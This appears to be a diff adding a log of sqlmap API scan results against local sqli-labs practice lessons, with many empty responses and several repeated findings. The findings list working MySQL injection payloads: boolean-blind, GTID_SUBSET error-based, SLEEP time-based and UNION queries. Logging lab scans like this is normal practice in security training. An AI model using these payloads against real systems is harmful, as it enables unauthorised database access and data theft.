@@ -1,0 +1,958 @@
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-23/",
+                "query": "id=2",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=2' AND 8826=8826 AND 'OjDT'='OjDT",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=2' AND GTID_SUBSET(CONCAT(0x7162717a71,(SELECT (ELT(9531=9531,1))),0x7170787071),9531) AND 'xtyB'='xtyB",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=2' AND (SELECT 2395 FROM (SELECT(SLEEP([SLEEPTIME])))vbQE) AND 'jofW'='jofW",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "Your",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        },
+        {
+            "status": 1,
+            "type": 2,
+            "value": "back-end DBMS: MySQL >= 5.6"
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-38/",
+                "query": "id=8",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=8' AND 9493=9493 AND 'oiZs'='oiZs",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=8' AND GTID_SUBSET(CONCAT(0x7178786271,(SELECT (ELT(6676=6676,1))),0x71717a7671),6676) AND 'cOMd'='cOMd",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=8' AND (SELECT 3958 FROM (SELECT(SLEEP([SLEEPTIME])))dfLA) AND 'QSin'='QSin",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": 200,
+                            "falseCode": null
+                        },
+                        "6": {
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns",
+                            "payload": "id=-9584' UNION ALL SELECT NULL,NULL,CONCAT(0x7178786271,0x6f4d6d566b4d4277666663665a467855544a6b57437a537156544e5546726c775979584d4c485851,0x71717a7671)-- -",
+                            "where": 2,
+                            "vector": [
+                                2,
+                                3,
+                                "[GENERIC_SQL_COMMENT]",
+                                "'",
+                                " AND '[RANDSTR]'='[RANDSTR]",
+                                "NULL",
+                                2,
+                                false,
+                                null,
+                                null,
+                                null
+                            ],
+                            "comment": "[GENERIC_SQL_COMMENT]",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": null,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "is",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        },
+        {
+            "status": 1,
+            "type": 2,
+            "value": "back-end DBMS: MySQL >= 5.6"
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-9/",
+                "query": "id=9",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=9' AND 5538=5538 AND 'tUUt'='tUUt",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.974,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=9' AND (SELECT 3112 FROM (SELECT(SLEEP([SLEEPTIME])))iyBi) AND 'tYhQ'='tYhQ",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.974,
+                            "trueCode": 200,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": null,
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.0.12"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-23/",
+                "query": "id=2",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=2' AND 8826=8826 AND 'OjDT'='OjDT",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=2' AND GTID_SUBSET(CONCAT(0x7162717a71,(SELECT (ELT(9531=9531,1))),0x7170787071),9531) AND 'xtyB'='xtyB",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=2' AND (SELECT 2395 FROM (SELECT(SLEEP([SLEEPTIME])))vbQE) AND 'jofW'='jofW",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "Your",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-38/",
+                "query": "id=8",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=8' AND 9493=9493 AND 'oiZs'='oiZs",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=8' AND GTID_SUBSET(CONCAT(0x7178786271,(SELECT (ELT(6676=6676,1))),0x71717a7671),6676) AND 'cOMd'='cOMd",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=8' AND (SELECT 3958 FROM (SELECT(SLEEP([SLEEPTIME])))dfLA) AND 'QSin'='QSin",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": 200,
+                            "falseCode": null
+                        },
+                        "6": {
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns",
+                            "payload": "id=-9584' UNION ALL SELECT NULL,NULL,CONCAT(0x7178786271,0x6f4d6d566b4d4277666663665a467855544a6b57437a537156544e5546726c775979584d4c485851,0x71717a7671)-- -",
+                            "where": 2,
+                            "vector": [
+                                2,
+                                3,
+                                "[GENERIC_SQL_COMMENT]",
+                                "'",
+                                " AND '[RANDSTR]'='[RANDSTR]",
+                                "NULL",
+                                2,
+                                false,
+                                null,
+                                null,
+                                null
+                            ],
+                            "comment": "[GENERIC_SQL_COMMENT]",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": null,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "is",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-9/",
+                "query": "id=9",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=9' AND 5538=5538 AND 'tUUt'='tUUt",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.974,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=9' AND (SELECT 3112 FROM (SELECT(SLEEP([SLEEPTIME])))iyBi) AND 'tYhQ'='tYhQ",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.974,
+                            "trueCode": 200,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": null,
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.0.12"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-23/",
+                "query": "id=2",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=2' AND 8826=8826 AND 'OjDT'='OjDT",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=2' AND GTID_SUBSET(CONCAT(0x7162717a71,(SELECT (ELT(9531=9531,1))),0x7170787071),9531) AND 'xtyB'='xtyB",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=2' AND (SELECT 2395 FROM (SELECT(SLEEP([SLEEPTIME])))vbQE) AND 'jofW'='jofW",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.957,
+                            "trueCode": 200,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "Your",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-38/",
+                "query": "id=8",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=8' AND 9493=9493 AND 'oiZs'='oiZs",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "2": {
+                            "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+                            "payload": "id=8' AND GTID_SUBSET(CONCAT(0x7178786271,(SELECT (ELT(6676=6676,1))),0x71717a7671),6676) AND 'cOMd'='cOMd",
+                            "where": 1,
+                            "vector": "AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": null,
+                            "falseCode": null
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=8' AND (SELECT 3958 FROM (SELECT(SLEEP([SLEEPTIME])))dfLA) AND 'QSin'='QSin",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": 200,
+                            "falseCode": null
+                        },
+                        "6": {
+                            "title": "Generic UNION query (NULL) - 1 to 20 columns",
+                            "payload": "id=-9584' UNION ALL SELECT NULL,NULL,CONCAT(0x7178786271,0x6f4d6d566b4d4277666663665a467855544a6b57437a537156544e5546726c775979584d4c485851,0x71717a7671)-- -",
+                            "where": 2,
+                            "vector": [
+                                2,
+                                3,
+                                "[GENERIC_SQL_COMMENT]",
+                                "'",
+                                " AND '[RANDSTR]'='[RANDSTR]",
+                                "NULL",
+                                2,
+                                false,
+                                null,
+                                null,
+                                null
+                            ],
+                            "comment": "[GENERIC_SQL_COMMENT]",
+                            "templatePayload": null,
+                            "matchRatio": 0.927,
+                            "trueCode": null,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": "is",
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.6"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [
+        {
+            "status": 1,
+            "type": 0,
+            "value": {
+                "url": "http://127.0.0.1:80/sqli-labs/Less-9/",
+                "query": "id=9",
+                "data": null
+            }
+        },
+        {
+            "status": 1,
+            "type": 1,
+            "value": [
+                {
+                    "place": "GET",
+                    "parameter": "id",
+                    "ptype": 2,
+                    "prefix": "'",
+                    "suffix": " AND '[RANDSTR]'='[RANDSTR]",
+                    "clause": [
+                        1,
+                        8,
+                        9
+                    ],
+                    "notes": [],
+                    "data": {
+                        "1": {
+                            "title": "AND boolean-based blind - WHERE or HAVING clause",
+                            "payload": "id=9' AND 5538=5538 AND 'tUUt'='tUUt",
+                            "where": 1,
+                            "vector": "AND [INFERENCE]",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.974,
+                            "trueCode": 200,
+                            "falseCode": 200
+                        },
+                        "5": {
+                            "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                            "payload": "id=9' AND (SELECT 3112 FROM (SELECT(SLEEP([SLEEPTIME])))iyBi) AND 'tYhQ'='tYhQ",
+                            "where": 1,
+                            "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+                            "comment": "",
+                            "templatePayload": null,
+                            "matchRatio": 0.974,
+                            "trueCode": 200,
+                            "falseCode": null
+                        }
+                    },
+                    "conf": {
+                        "textOnly": null,
+                        "titles": null,
+                        "code": null,
+                        "string": null,
+                        "notString": null,
+                        "regexp": null,
+                        "optimize": null
+                    },
+                    "dbms": "MySQL",
+                    "dbms_version": [
+                        ">= 5.0.12"
+                    ],
+                    "os": null
+                }
+            ]
+        }
+    ],
+    "error": []
+}
+------------- Python by chentuo -------------------
+http://127.0.0.1:8775
+{
+    "success": true,
+    "data": [],
+    "error": []
+}
+------------- Python by chentuo -------------------
